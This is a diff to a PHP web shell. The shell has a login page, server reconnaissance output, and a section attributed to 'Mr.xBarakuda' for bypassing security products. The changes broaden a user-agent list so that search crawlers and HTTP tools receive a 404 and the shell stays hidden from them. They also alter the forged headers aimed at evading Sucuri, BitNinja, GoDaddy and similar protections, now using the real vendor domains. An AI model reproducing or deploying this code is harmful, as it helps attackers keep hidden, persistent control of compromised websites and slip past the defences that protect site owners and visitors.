@@ -31,11 +31,30 @@ if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
     $_POST   = kudaxx($_POST);
     $_COOKIE = kudaxx($_COOKIE);
 }
-if (!empty($_SERVER['HTTP_USER_AGENT'])) { // fucking all crawler
-$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl", "DuckDuckBot", "Baidu", "Sogou", "Exabot", "Majestic", "Ahrefs", "SEMRush", "rogerbot", "dotbot", "Screaming Frog", "Pinterest", "spider", "bot");
-if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-    header('HTTP/1.0 404 Not Found');
-    exit;}
+function isCrawler() {
+    if (empty($_SERVER['HTTP_USER_AGENT'])) {
+        return false;
+    }
+    $userAgents = ["Googlebot", "Google-InspectionTool", "GoogleOther", "AdsBot-Google", "Bingbot", "bingpreview", "Slurp", "Yahoo! Slurp", "YahooSeeker", "DuckDuckBot", "DuckDuckGo", "Baiduspider", "BaiduImagespider", "BaiduMobile", "YandexBot", "YandexImages", "YandexAccessibilityBot", "YandexMobile", "Sogou", "Sogou Spider", "Sogou-Mobile", "Exabot", "MJ12bot", "AhrefsBot", "SemrushBot", "SEMrush", "facebookexternalhit", "Facebot", "Instagram", "Twitterbot", "LinkedInBot", "Pinterest", "Discordbot", "TelegramBot", "Applebot", "WhatsApp", "iMessage", "rogerbot", "dotbot", "Screaming Frog", "SiteSucker", "Majestic", "archive.org", "ia_archiver", "ArchiveBot", "PycURL", "curl", "Wget", "python-requests", "HTTPie", "Apache-HttpClient", "okhttp", "Go-http-client", "Java", "libwww-perl", "bot", "crawler", "spider", "scraper", "BingPreview", "Google Web Preview", "Mediapartners-Google", "AdsBot-Google-Mobile", "Feedfetcher-Google"];
+    $additionalPatterns = ['/libwww-perl/i', '/python-requests/i', '/python-requests\/[0-9]/i', '/java\/[0-9]/i', '/okhttp\/[0-9]/i', '/go-http-client/i', '/apache-httpclient/i', '/unirest/i', '/httpclient/i', '/http_browser/i', '/indy library/i', '/nokka crawl agent/i', '/site sneaker/i', '/zeus/i', '/zyborg/i'];
+    
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+    foreach ($userAgents as $pattern) {
+        if (stripos($userAgent, $pattern) !== false) {
+            return true;
+        }
+    }
+    foreach ($additionalPatterns as $pattern) {
+        if (preg_match($pattern, $userAgent)) {
+            return true;
+        }
+    }
+    return false;
+}
+if (isCrawler()) {
+    http_response_code(404);
+    echo "Not Found";
+    exit();
 }
 function login_shell() {
     echo "<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
@@ -79,8 +98,8 @@ exit;
 // Bypass Sever Function by Mr.xBarakuda
 $ipRotations = ['192.0.2.10','198.51.100.23','203.0.113.45','203.0.113.46','198.51.100.24'];
 $selectedIp = $ipRotations[array_rand($ipRotations)];
-$userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 14_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1','Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'];
-$randomUA = $userAgents[array_rand($userAgents)];
+$browser = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 14_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1','Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'];
+$randomUA = $browser[array_rand($browser)];
 header('X-Request-Timestamp: ' . time());
 # Sucuri (Cloudflare)
 if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
@@ -92,7 +111,7 @@ if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
     // Spoof secure headers
     header('HTTP_CF_VISITOR: Cloudflare-Visitor');
     header('X-Forwarded-For: '.(isset($apacheHeaders['CF-Visitor']) ? $apacheHeaders['CF-Visitor'] : $selectedIp));
-    header('X-Origin: https://legitimate-site.com');
+    header('X-Origin: https://sucuri.net');
 }
 # Monarx
 if (defined('MONARX_VERSION') || function_exists('monarx_get_headers') || isset($_SERVER['HTTP_X_MONARX'])) {
@@ -147,7 +166,7 @@ if (function_exists('bitninja_get_server_data') && defined('BITNINJA_VERSION')) 
     
     // Spoof traffic
     $_SERVER['HTTP_USER_AGENT'] = $randomUA;
-    header('X-BitNinja-Referrer: https://safe-site.com');
+    header('X-BitNinja-Referrer: https://bitninja.com');
 }
 # ModSecurity
 if (function_exists('apache_request_headers')) {
@@ -167,7 +186,7 @@ if (function_exists('apache_request_headers')) {
 if (isset($_SERVER['HTTP_X_WEB_FACTOR']) && stripos($_SERVER['HTTP_X_WEB_FACTOR'], 'GoDaddy') !== false) {
     // Full GoDaddy bypass
     header('X-GoDaddy-Security: bypass');
-    header('X-Origin: https://secure-site.com');
+    header('X-Origin: https://godaddy.com');
     header('X-Forwarded-For: ' .$selectedIp);
     header('X-Real-IP: ' .$selectedIp);
     
@@ -574,7 +593,7 @@ $total = hdd(disk_total_space("/"));
 $used = $total - $freespace;
 $sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=deepskyblue>OFF</font>";
 $magico = (ini_get('magic_quotes_gpc') == '1') ? "<font color=red>ON</font>" : "<font color=deepskyblue>OFF</font>";
-$getds = @ini_get("disable_functions");
+$getds = ini_get("disable_functions");
 $ds = (!empty($getds)) ? "<font color=red>$getds</font>" : "<font color=deepskyblue>NONE</font>";
 $mysql = (function_exists('mysqli_connect')) ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>";
 $curl = (function_exists('curl_version')) ? "<font color=deepskyblue>ON</font>" : "<font color=red>OFF</font>";
@@ -616,7 +635,7 @@ echo "User: <font color=deepskyblue>" . $user . "</font> ( " . $uid . " ) Group:
 echo "Server IP: <font color=deepskyblue>" . $ip . "</font> | Server Port: <font color=deepskyblue>" . $sport . "</font><br>";
 echo "Your IP: <font color=deepskyblue>" . $_SERVER['REMOTE_ADDR'] . "</font> | Your Port: <font color=deepskyblue>" . $_SERVER['REMOTE_PORT'] . "</font><br>";
 echo "User Agent: <font color=deepskyblue>" . $_SERVER['HTTP_USER_AGENT'] . "</font><br>";
-echo "HDD: <font color=deepskyblue>" . $used . "</font> ( Total: <font color=deepskyblue>" . $total . "</font> ) ( Free: <font color=deepskyblue>" . $freespace . "</font> )<br>";
+echo "HDD Used: <font color=deepskyblue>" . $used . "</font> ( Total: <font color=deepskyblue>" . $total . "</font> ) ( Free: <font color=deepskyblue>" . $freespace . "</font> )<br>";
 echo "Websites: <font color=deepskyblue>" . $count . "</font> Domains<br>";
 echo "Time On Server: <font color=deepskyblue>" . date("d M Y - h:i a") . "</font><br>";
 echo "Safe Mode: " . $sm . "<br>";
